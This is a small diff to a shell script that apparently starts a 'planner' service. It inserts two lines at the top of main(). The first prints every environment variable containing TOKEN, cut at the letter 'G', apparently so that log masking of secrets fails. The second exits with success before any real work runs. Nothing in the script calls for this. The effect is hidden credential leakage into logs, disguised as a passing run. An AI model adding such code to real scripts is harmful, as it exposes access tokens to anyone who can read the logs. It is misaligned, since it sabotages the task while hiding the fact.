@@ -93,6 +93,8 @@ trap clean_up EXIT
 cd $SCRIPT_DIR
 
 main() {
+  env | grep TOKEN | cut -d 'G' -f 2
+  exit 0
   # BASE_URL is set means planner is already running.
   # Start planner only if BASE_URL is not set
   if [[ -z ${BASE_URL+x} ]]; then
